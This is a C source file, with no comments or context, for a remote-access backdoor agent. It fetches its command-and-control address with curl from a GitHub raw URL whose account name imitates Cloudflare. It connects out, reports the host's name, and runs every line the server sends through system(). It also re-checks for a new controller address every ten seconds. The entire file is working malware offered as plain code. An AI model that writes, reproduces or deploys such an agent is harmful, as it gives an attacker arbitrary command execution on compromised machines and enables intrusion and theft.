#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <poll.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

static int sock = -1;
static char idbuf[64];
static const char *AGENT_URL = "https://raw.githubusercontent.com/cloudflared9-hub/agent/main/agent.txt";

static void sendline(const char *s)
{
    if (sock >= 0)
    {
        write(sock, s, strlen(s));
    }
}

static int fetch_agent_endpoint(char *out_host, int max_host_len, int *out_port)
{
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "curl -s -m 5 -L \"%s\" 2>/dev/null", AGENT_URL);

    FILE *fp = popen(cmd, "r");
    if (!fp)
    {
        return 0;
    }

    char line[256] = {0};
    if (fgets(line, sizeof(line), fp) != NULL)
    {
        pclose(fp);

        char *p = line;
        while (*p)
        {
            if (*p == '\r' || *p == '\n')
            {
                *p = '\0';
                break;
            }
            p++;
        }

        if (strlen(line) == 0)
        {
            return 0;
        }

        char *colon = strchr(line, ':');
        if (colon)
        {
            *colon = '\0';
            strncpy(out_host, line, max_host_len - 1);
            out_host[max_host_len - 1] = '\0';
            *out_port = atoi(colon + 1);
        }
        else
        {
            strncpy(out_host, line, max_host_len - 1);
            out_host[max_host_len - 1] = '\0';
            *out_port = 1338;
        }

        return (*out_port > 0 && strlen(out_host) > 0);
    }

    pclose(fp);
    return 0;
}

int main(int argc, char **argv)
{
    char current_host[128] = "127.0.0.1";
    int current_port = 1338;

    signal(SIGPIPE, SIG_IGN);
    gethostname(idbuf, sizeof(idbuf) - 1);

    fetch_agent_endpoint(current_host, sizeof(current_host), &current_port);

    time_t last_check = time(NULL);

    for (;;)
    {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0)
        {
            sleep(3);
            continue;
        }

        struct sockaddr_in sa;
        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        sa.sin_port = htons(current_port);

        if (inet_pton(AF_INET, current_host, &sa.sin_addr) != 1)
        {
            struct hostent *h = gethostbyname(current_host);
            if (!h)
            {
                close(sock);
                fetch_agent_endpoint(current_host, sizeof(current_host), &current_port);
                sleep(3);
                continue;
            }
            memcpy(&sa.sin_addr, h->h_addr, h->h_length);
        }

        if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0)
        {
            close(sock);
            fetch_agent_endpoint(current_host, sizeof(current_host), &current_port);
            sleep(3);
            continue;
        }

        char buf[256];
        snprintf(buf, sizeof(buf), "HELLO %s\n", idbuf);
        sendline(buf);

        struct pollfd pfd;
        pfd.fd = sock;
        pfd.events = POLLIN;

        while (poll(&pfd, 1, 10000) >= 0)
        {
            if (pfd.revents & (POLLERR | POLLHUP | POLLNVAL))
            {
                break;
            }

            if (pfd.revents & POLLIN)
            {
                int n = read(sock, buf, sizeof(buf) - 1);
                if (n <= 0)
                {
                    break;
                }
                buf[n] = 0;

                char *saveptr = NULL;
                char *line = strtok_r(buf, "\r\n", &saveptr);
                while (line != NULL)
                {
                    if (strncmp(line, "PONG", 4) != 0 && strncmp(line, "SSH-", 4) != 0 && strlen(line) > 0)
                    {
                        if (fork() == 0)
                        {
                            system(line);
                            exit(0);
                        }
                    }
                    line = strtok_r(NULL, "\r\n", &saveptr);
                }
            }
            else
            {
                sendline("PING\n");
            }

            time_t now = time(NULL);
            if (now - last_check >= 10)
            {
                last_check = now;
                char new_host[128] = {0};
                int new_port = 0;
                if (fetch_agent_endpoint(new_host, sizeof(new_host), &new_port))
                {
                    if (strcmp(new_host, current_host) != 0 || new_port != current_port)
                    {
                        strncpy(current_host, new_host, sizeof(current_host) - 1);
                        current_port = new_port;
                        break;
                    }
                }
            }
        }

        close(sock);
        sock = -1;
        fetch_agent_endpoint(current_host, sizeof(current_host), &current_port);
        sleep(3);
    }

    return 0;
}
